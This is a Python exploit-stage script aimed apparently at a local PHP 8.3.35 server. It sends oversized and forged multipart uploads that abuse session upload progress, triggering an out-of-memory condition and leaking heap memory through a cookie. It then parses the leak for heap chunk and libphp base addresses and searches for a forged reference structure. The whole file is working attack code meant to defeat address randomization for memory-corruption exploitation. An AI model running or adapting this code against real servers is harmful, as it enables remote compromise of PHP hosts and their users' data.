"""Leak and analyze the heap layout on 8.3.35 to find where the reference is."""
import sys, os, struct, time
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import exploit as E
from collections import Counter

URL = "http://127.0.0.1:18112/"
t = E.Target(URL, timeout=180.0, verbose=False)

# Stage 1: OOM trigger with 256MB (same as poc)
print("[*] Stage 1: OOM trigger (256MB)...", flush=True)
parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
parts += [
    {"name": "PHPSESSID", "data": b"\x00"},
    {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    {"name": "f", "filename": "a.txt", "data": b"A" * 64},
]
parts.append({"name": "big", "data": b"B" * int(256 * 1024 * 1024)})
r1 = t.post(E.build_multipart(parts, b"S" * 17), b"S" * 17, read_cap=1 << 20, timeout=180)
time.sleep(0.5)

# Stage 2: leak
print("[*] Stage 2: leak...", flush=True)
parts = [
    {"name": "PHPSESSID", "data": E.SID},
    {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
]
for i in range(841):
    val = (f"v{i:04d}" + "x" * 44)[:48]
    parts.append({"name": str(1000 + i), "data": val.encode()})
forge = bytearray(b"A" * 79)
struct.pack_into("<Q", forge, 0x10, 0x1000)
forge[0x18] = ord("L")
parts.append({"name": "1999", "data": bytes(forge)})
r2 = t.post(E.build_multipart(parts, b"B" * 10), b"B" * 10, read_cap=9 << 20, timeout=180)
raw = E.parse_cookie(r2)
print(f"[*] Cookie: {len(raw)}B", flush=True)

if len(raw) < 100:
    print("[-] Stage 1 failed - no OOM", flush=True)
    sys.exit(1)

# Find chunk base
c = Counter()
for i in range(0, len(raw) - 8, 8):
    v = int.from_bytes(raw[i:i + 8], "little")
    if 0x700000000000 <= v < 0x800000000000:
        c[v & ~0x1FFFFF] += 1
chunk = c.most_common(1)[0][0] if c else 0
print(f"[*] Chunk base: 0x{chunk:x}", flush=True)

# Find libphp base
libphp = 0
for i in range(0, len(raw) - 8, 8):
    v = int.from_bytes(raw[i:i + 8], "little")
    if 0x7f0000000000 <= v < 0x7fffffffff:
        libphp = v
        break
print(f"[*] Libphp base: 0x{libphp:x}", flush=True)

# Calculate htdata
htdata = chunk + 0x690d8
print(f"[*] HTDATA: 0x{htdata:x}", flush=True)

# Find where chunk base appears in the cookie
chunk_bytes = chunk.to_bytes(8, "little")
idx = raw.find(chunk_bytes)
print(f"[*] Chunk base at cookie offset: {idx}", flush=True)

# Dump 512 bytes around the chunk base to understand the layout
if idx >= 0:
    start = max(0, idx - 64)
    end = min(len(raw), idx + 512)
    dump = raw[start:end]
    print(f"[*] Hex dump around chunk base (offset {start}-{end}):", flush=True)
    for i in range(0, len(dump), 16):
        hexstr = " ".join(f"{b:02x}" for b in dump[i:i+16])
        print(f"    {start+i:04x}: {hexstr}", flush=True)

    # Check what's at various offsets
    print(f"\n[*] Values at various offsets from chunk base:", flush=True)
    for off in [0, 0x10, 0x18, 0x20, 0x100, 0x200, 0xfd0, 0xfd8, 0x1000, 0x1020]:
        if idx + off + 8 <= len(raw):
            val = int.from_bytes(raw[idx + off:idx + off + 8], "little")
            print(f"    chunk+0x{off:04x}: 0x{val:x}", flush=True)

# Look for the reference (rc=1, typ=0x1A pattern)
print(f"\n[*] Searching for reference pattern (rc=1, typ=0x1A)...", flush=True)
for i in range(0, len(raw) - 16, 8):
    rc = struct.unpack_from("<I", raw, i)[0]
    typ = struct.unpack_from("<I", raw, i + 4)[0]
    if rc == 1 and typ == 0x1A:
        print(f"    Found at cookie offset {i:04x}: rc={rc}, typ=0x{typ:x}")
        # Check what's at the next 8 bytes (val.value)
        if i + 16 <= len(raw):
            val = int.from_bytes(raw[i+8:i+16], "little")
            print(f"    val.value = 0x{val:x}", flush=True)

print("\n[*] done", flush=True)
